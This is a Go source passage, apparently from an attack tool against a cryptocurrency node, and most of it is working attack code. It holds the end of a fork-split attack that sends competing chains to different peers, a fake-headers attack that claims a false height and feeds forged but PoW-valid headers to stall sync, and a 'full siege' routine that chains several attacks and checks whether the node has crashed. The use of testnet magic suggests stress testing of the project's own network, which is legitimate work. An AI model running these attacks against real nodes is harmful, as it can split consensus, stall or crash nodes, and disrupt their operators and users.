	fmt.Sscanf(ci.Bits, "%x", &bits)
	currentHeight := uint32(ci.Height)

	tipBlock, _ := fetchBlockByHeight(rpc, int(currentHeight))
	baseTimestamp := uint32(time.Now().Unix())
	if tipBlock != nil {
		baseTimestamp = tipBlock.Timestamp
	}

	// Build multiple competing chains from the same parent
	type chainFork struct {
		blocks []*types.Block
		tag    string
	}

	numForks := len(targets)
	if numForks < 2 {
		numForks = 2
	}

	forks := make([]chainFork, numForks)

	log("Building %d competing forks of %d blocks each from height %d...", numForks, count, currentHeight+1)
	for f := 0; f < numForks; f++ {
		forks[f].tag = fmt.Sprintf("fork-%d", f)
		forkPrevHash := prevHash
		forkTimestamp := baseTimestamp

		for i := 0; i < count; i++ {
			newHeight := currentHeight + uint32(i) + 1
			forkTimestamp += uint32(5 + f*2)

			cb := makeCoinbaseTx(newHeight, subsidy, fmt.Sprintf("%s-b%d", forks[f].tag, i))

			block := &types.Block{
				Header: types.BlockHeader{
					Version:   1,
					PrevBlock: forkPrevHash,
					Timestamp: forkTimestamp,
					Bits:      bits,
					Nonce:     0,
				},
				Transactions: []types.Transaction{cb},
			}
			merkle, _ := crypto.ComputeMerkleRoot(block.Transactions)
			block.Header.MerkleRoot = merkle

			if !sealBlock(&block.Header, 500_000_000) {
				results = append(results, result{
					Attack: "fork-split",
					Detail: fmt.Sprintf("%s: PoW exhausted at block %d", forks[f].tag, i),
				})
				break
			}

			forks[f].blocks = append(forks[f].blocks, block)
			forkPrevHash = crypto.HashBlockHeader(&block.Header)
		}

		results = append(results, result{
			Attack:  "fork-split",
			Success: len(forks[f].blocks) > 0,
			Detail:  fmt.Sprintf("built %s: %d blocks from height %d", forks[f].tag, len(forks[f].blocks), currentHeight+1),
		})
	}

	// Submit fork-0 via RPC (to the primary node)
	if len(forks) > 0 && len(forks[0].blocks) > 0 {
		accepted := 0
		for _, block := range forks[0].blocks {
			wasRejected, _ := submitBlock(rpc, block)
			if !wasRejected {
				accepted++
			}
		}
		results = append(results, result{
			Attack:  "fork-split",
			Success: accepted > 0,
			Detail:  fmt.Sprintf("submitted %s via RPC: %d/%d accepted", forks[0].tag, accepted, len(forks[0].blocks)),
		})
	}

	// Send fork-1+ via P2P to other targets
	for f := 1; f < len(forks) && f-1 < len(targets); f++ {
		t := strings.TrimSpace(targets[f-1])
		if t == "" {
			continue
		}

		conn, err := net.DialTimeout("tcp", t, 5*time.Second)
		if err != nil {
			results = append(results, result{
				Attack: "fork-split",
				Detail: fmt.Sprintf("connect to %s failed: %v", t, err),
			})
			continue
		}

		if err := doHandshake(conn, currentHeight+uint32(len(forks[f].blocks))); err != nil {
			conn.Close()
			results = append(results, result{
				Attack: "fork-split",
				Detail: fmt.Sprintf("handshake with %s failed: %v", t, err),
			})
			continue
		}

		sent := 0
		for _, block := range forks[f].blocks {
			blockData, _ := block.SerializeToBytes()
			if err := writeMessage(conn, testnetMagic, "block", blockData); err != nil {
				break
			}
			sent++
			time.Sleep(50 * time.Millisecond)
		}
		conn.Close()

		results = append(results, result{
			Attack:  "fork-split",
			Success: sent > 0,
			Detail:  fmt.Sprintf("sent %s to %s via P2P: %d/%d blocks", forks[f].tag, t, sent, len(forks[f].blocks)),
		})
	}

	return results
}

// ============================================================
// ATTACK 6: Fake Headers Chain (Sync Stall)
// ============================================================
// Connects as a peer claiming massive height, then when the target
// sends getheaders, responds with a chain of fake headers that have
// valid PoW but build on a fake genesis. This stalls the sync state
// machine — the node enters HEADER_SYNC and wastes time validating
// and storing headers for a chain that will never connect.

func attackHeadersLie(target string, count int) []result {
	logSection("ATTACK: Fake Headers Chain (Sync Stall)")
	if target == "" {
		return []result{{Attack: "headers-lie", Detail: "need -target <p2p-addr>"}}
	}

	var results []result

	log("Connecting to %s (claiming height %d) ...", target, count*10)
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return []result{{Attack: "headers-lie", Detail: fmt.Sprintf("connect failed: %v", err)}}
	}
	defer conn.Close()

	claimHeight := uint32(count * 10)
	if err := doHandshake(conn, claimHeight); err != nil {
		return []result{{Attack: "headers-lie", Detail: fmt.Sprintf("handshake failed: %v", err)}}
	}
	log("Handshake OK — building %d fake headers with valid PoW at min difficulty...", count)

	// Build a fake chain of headers with valid PoW at minimum difficulty
	fakeHeaders := make([]types.BlockHeader, 0, count)
	var prevHash types.Hash
	rand.Read(prevHash[:])
	timestamp := uint32(time.Now().Unix()) - uint32(count*5)
	minBits := uint32(0x207fffff)

	for i := 0; i < count; i++ {
		header := types.BlockHeader{
			Version:   1,
			PrevBlock: prevHash,
			Timestamp: timestamp + uint32(i*5),
			Bits:      minBits,
			Nonce:     0,
		}

		// Fake merkle root
		rand.Read(header.MerkleRoot[:])

		// Mine at minimum difficulty — should be fast
		target := crypto.CompactToHash(minBits)
		for j := uint64(0); j < 10_000_000; j++ {
			hash := activeHasher.PoWHash(header.SerializeToBytes())
			if hash.LessOrEqual(target) {
				break
			}
			header.Nonce++
		}

		fakeHeaders = append(fakeHeaders, header)
		prevHash = crypto.HashBlockHeader(&header)
	}

	log("Built %d fake headers", len(fakeHeaders))
	results = append(results, result{
		Attack:  "headers-lie",
		Success: len(fakeHeaders) > 0,
		Detail:  fmt.Sprintf("built %d fake headers with valid PoW at min difficulty", len(fakeHeaders)),
	})

	// Wait for the node to send getheaders (it should, since we claimed high height)
	log("Waiting for getheaders from target (30s timeout)...")
	headersSent := 0
	deadline := time.Now().Add(30 * time.Second)

	for time.Now().Before(deadline) {
		cmd, payload, err := readFullMessage(conn, 5*time.Second)
		if err != nil {
			continue
		}

		switch cmd {
		case "getheaders":
			batchSize := 2000
			if batchSize > len(fakeHeaders)-headersSent {
				batchSize = len(fakeHeaders) - headersSent
			}
			if batchSize <= 0 {
				log("  getheaders received but no more headers to send")
				continue
			}

			batch := fakeHeaders[headersSent : headersSent+batchSize]

			var headersPayload bytes.Buffer
			writeVarInt(&headersPayload, uint64(len(batch)))
			for _, hdr := range batch {
				hdr.Serialize(&headersPayload)
				writeVarInt(&headersPayload, 0)
			}

			if err := writeMessage(conn, testnetMagic, "headers", headersPayload.Bytes()); err != nil {
				log("  headers send error: %v", err)
				results = append(results, result{
					Attack: "headers-lie",
					Detail: fmt.Sprintf("failed to send headers batch: %v", err),
				})
				break
			}
			headersSent += batchSize
			log("  Sent %d fake headers (total: %d/%d)", batchSize, headersSent, len(fakeHeaders))

		case "getblocks":
			log("  Received getblocks — ignoring (headers-only attack)")

		case "ping":
			if len(payload) >= 8 {
				writeMessage(conn, testnetMagic, "pong", payload[:8])
			}

		case "sendheaders":
			log("  Received sendheaders — acknowledged")

		case "getaddr":
			var emptyAddr bytes.Buffer
			writeVarInt(&emptyAddr, 0)
			writeMessage(conn, testnetMagic, "addr", emptyAddr.Bytes())
			log("  Received getaddr — sent empty response")

		default:
			log("  Received unexpected message: %s (%d bytes)", cmd, len(payload))
		}

		if headersSent >= len(fakeHeaders) {
			break
		}
	}

	results = append(results, result{
		Attack:  "headers-lie",
		Success: headersSent > 0,
		Detail:  fmt.Sprintf("sent %d/%d fake headers to target (stalling sync state machine)", headersSent, len(fakeHeaders)),
	})

	time.Sleep(2 * time.Second)
	alive := checkNodeAlive(target)
	results = append(results, result{
		Attack:  "headers-lie",
		Success: !alive,
		Detail:  fmt.Sprintf("node alive after headers-lie: %v", alive),
	})

	return results
}

// ============================================================
// ATTACK 7: Full Siege — All Attacks in Sequence
// ============================================================

func attackFullSiege(target string, rpc string, poisonAddrs string, count int) []result {
	logSection("FULL SIEGE — All Attacks in Sequence")
	log("Target P2P: %s | RPC: %s | Count: %d", target, rpc, count)

	var allResults []result

	// Pre-flight snapshot
	if rpc != "" {
		ci, _ := fetchChainInfo(rpc)
		if ci != nil {
			log("PRE-ATTACK STATE: height=%d bits=%s chain=%s", ci.Height, ci.Bits, ci.Chain)
		}
	}

	r := attackSeedPoison(target, poisonAddrs, 5)
	allResults = append(allResults, r...)
	time.Sleep(time.Second)

	r = attackHeadersLie(target, count)
	allResults = append(allResults, r...)
	time.Sleep(time.Second)

	r = attackFakeBlocksP2P(target, rpc, count)
	allResults = append(allResults, r...)
	time.Sleep(time.Second)

	if rpc != "" {
		r = attackDifficultyInflate(rpc, 3)
		allResults = append(allResults, r...)
		time.Sleep(time.Second)

		r = attackForkSplit(target, rpc, count/2)
		allResults = append(allResults, r...)
		time.Sleep(time.Second)
	}

	r = attackEclipseStall(target, poisonAddrs)
	allResults = append(allResults, r...)

	// Post-attack snapshot
	if rpc != "" {
		ci, _ := fetchChainInfo(rpc)
		if ci != nil {
			log("POST-ATTACK STATE: height=%d bits=%s chain=%s", ci.Height, ci.Bits, ci.Chain)
		}
	}

	alive := checkNodeAlive(target)
	finalResult := result{
		Attack:  "full-siege",
		Success: !alive,
		Detail:  fmt.Sprintf("FINAL: node alive=%v after full siege", alive),
	}
	allResults = append(allResults, finalResult)
	logResult(finalResult)

	return allResults
}

// Unused but required by the compiler for the big import
var _ = new(big.Int)
